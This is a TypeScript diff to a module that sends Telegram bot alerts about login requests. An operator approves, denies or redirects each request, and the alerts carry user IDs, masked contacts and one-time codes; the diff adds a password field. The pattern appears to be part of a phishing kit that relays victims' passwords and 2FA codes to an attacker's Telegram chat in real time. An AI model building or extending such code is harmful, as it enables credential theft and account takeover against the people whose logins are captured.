@@ -1,12 +1,27 @@
-import { SITE_DISPLAY_NAME } from "./site-url"
+
+export type AdminRequestKind = 'login' | 'otp' | 'password' | 'verify' | string
+export type AdminLoginOutcomeAction = 'approve' | 'deny' | 'redirect'
+export type AdminLoginOutcomeData = {
+  action: AdminLoginOutcomeAction
+  requestKind?: AdminRequestKind
+  userId?: string
+  password?: string
+  code?: string
+  method?: string
+  maskedEmail?: string
+  maskedPhone?: string
+  [key: string]: unknown
+}
+
+import {
+  SITE_DISPLAY_NAME
+} from "./site-url"
 const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim()
 const CHAT_IDS = (process.env.TELEGRAM_CHAT_ID || '')
   .split(/[,;\n]+/)
   .map((id) => id.trim())
   .filter(Boolean)
 
-export type AdminLoginOutcomeAction = 'approve' | 'deny' | 'redirect'
-export type AdminRequestKind = 'login' | 'otp'
 
 function escapeHtml(s: string): string {
   return s
@@ -60,15 +75,7 @@ function methodContactLines(method: string | undefined, maskedEmail?: string, ma
   return `📧 Method: ${asCode(methodLabel)}\n${contact}`
 }
 
-export async function sendAdminLoginOutcomeNotification(data: {
-  action: AdminLoginOutcomeAction
-  requestKind?: AdminRequestKind
-  userId?: string
-  method?: 'email' | 'text' | string
-  maskedEmail?: string
-  maskedPhone?: string
-  code?: string
-}): Promise<boolean> {
+export async function sendAdminLoginOutcomeNotification(data: AdminLoginOutcomeData): Promise<boolean> {
   const isOtp = data.requestKind === 'otp'
   const contact = methodContactLines(data.method, data.maskedEmail, data.maskedPhone)
   const codeLine = isOtp && data.code ? `\n🔐 Code: ${asCode(data.code)}` : ''
